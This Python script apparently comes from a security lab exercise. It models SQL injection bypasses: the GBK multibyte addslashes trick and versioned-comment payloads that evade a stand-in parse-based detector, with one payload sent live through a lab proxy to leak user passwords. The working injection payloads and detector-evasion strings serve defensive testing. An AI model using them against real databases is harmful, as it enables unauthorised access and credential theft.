#!/usr/bin/env python3
"""Cardinal — MODELED attacks (no new infra) for defenses we don't run live:

  A. Charset / multibyte "addslashes" bypass  — modeled at the byte level, plus
     the finding that modern PyMySQL does NOT reproduce it.
  B. Structural-detection bypass              — a stand-in parse/tokenise detector
     (representing libinjection / parse-tree / RASP) and payloads that evade it.
     The "parser differential" case is confirmed LIVE through the proxy.

Run on the attacker node:  python3 /scripts/model_bypasses.py
(the live checks go through the proxy at 172.30.0.10; the detector model is pure
Python and needs nothing).
"""
import re
import sys
import urllib.parse
import urllib.request

PROXY = "http://172.30.0.10"


def live_search(q, impl="concat"):
    url = PROXY + "/search?" + urllib.parse.urlencode({"impl": impl, "q": q})
    try:
        return urllib.request.urlopen(url, timeout=10).read().decode("utf-8", "ignore")
    except Exception as e:
        return f"(error: {e})"


# ============================================================================
print("=" * 70)
print("A.  CHARSET / MULTIBYTE  ('addslashes' + GBK) — MODELED")
print("=" * 70)
# The vulnerable (PHP-era) flow escapes at the BYTE level: ' (0x27) -> \' (0x5c 0x27).
raw_in = b"\xbf'"                       # attacker sends 0xbf then a quote
byte_escaped = raw_in.replace(b"'", b"\\'")   # addslashes, byte-wise
print(f"  attacker bytes      : {raw_in!r}")
print(f"  after byte addslashes: {byte_escaped!r}   (0x27 -> 0x5c 0x27)")
# On a GBK connection the server reads 0xbf 0x5c as ONE character, freeing 0x27:
try:
    combined = byte_escaped[:2].decode("gbk")
    print(f"  server (GBK) reads 0xbf5c as one char {combined!r} -> the backslash is")
    print(f"  consumed, so the trailing 0x27 (') is now a LIVE quote -> break-out.")
except Exception as e:
    print(f"  gbk decode: {e}")
print("  => That is the classic bypass: escaping is byte-level and charset-unaware.")
print()
print("  LIVE on this stack: PyMySQL escapes at the Unicode-string level and then")
print("  encodes to the charset, so a lone 0xbf raises UnicodeEncodeError instead of")
print("  slipping through. The bug belongs to byte-level escapers (PHP addslashes /")
print("  mysql_real_escape_string without mysql_set_charset), NOT to this driver.")

# ============================================================================
print()
print("=" * 70)
print("B.  STRUCTURAL DETECTION (stand-in) — MODELED, with a LIVE differential")
print("=" * 70)

def structural_detector(value: str) -> bool:
    """Stand-in for a parse/tokenise detector (libinjection/CRS-style). It first
    NORMALISES the input the way such engines do -- strip /* */ comments, collapse
    whitespace, lowercase -- then flags injection structure (UNION / tautology /
    stacked). Returns True = 'attack detected'."""
    norm = re.sub(r"/\*.*?\*/", " ", value)      # strip block comments
    norm = re.sub(r"\s+", " ", norm).lower()
    return bool(
        re.search(r"\bunion\b\s+\bselect\b", norm)
        or re.search(r"\bor\b\s+['\"]?\d+['\"]?\s*=\s*['\"]?\d+", norm)
        or ";" in norm
    )

cases = {
    "plain UNION                 (caught)":        "zzz' UNION SELECT a,b FROM users-- -",
    "OR tautology                (caught)":        "' OR '1'='1",
    "inline comment /**/  (caught: normalised)":   "zzz' UNION/**/SELECT a,b FROM users-- -",
    "versioned comment /*!..*/   (BYPASS)":        "zzz' /*!50000UNION*/ /*!50000SELECT*/ a,b FROM users-- -",
}
print("  detector verdicts (True = caught):")
for name, payload in cases.items():
    print(f"    {('CAUGHT ' if structural_detector(payload) else 'MISSED '):8} {name}")

print()
print("  Why the misses are real bypasses — PARSER DIFFERENTIAL:")
print("  the detector strips /* */ as a comment, so it never sees a UNION. But")
print("  MariaDB EXECUTES /*!50000UNION*/ as a real UNION. Confirm live via proxy:")
vc = "zzz' /*!50000UNION*/ /*!50000SELECT*/ id,username,password,display_name,title,department,status FROM users WHERE username LIKE '"
leaked = "alicepw" in live_search(vc)
print(f"    detector says: {'CAUGHT' if structural_detector(vc) else 'benign (MISSED)'}")
print(f"    real DB result: {'creds LEAKED (UNION executed)' if leaked else 'no leak'}")
print()
print("  Point-not-watched (SECOND-ORDER): a boundary detector inspects the")
print("  incoming value -- here just the string stored in `status`, which is benign:")
stored = "zzz' UNION SELECT ... FROM users-- -"
print(f"    detector on the STORED value at input: {'CAUGHT' if structural_detector(stored) else 'benign (MISSED)'}")
print("    ...but the malicious query is built later from storage (the /myteam query),")
print("    which the input-boundary detector never inspects -> injection at use time.")
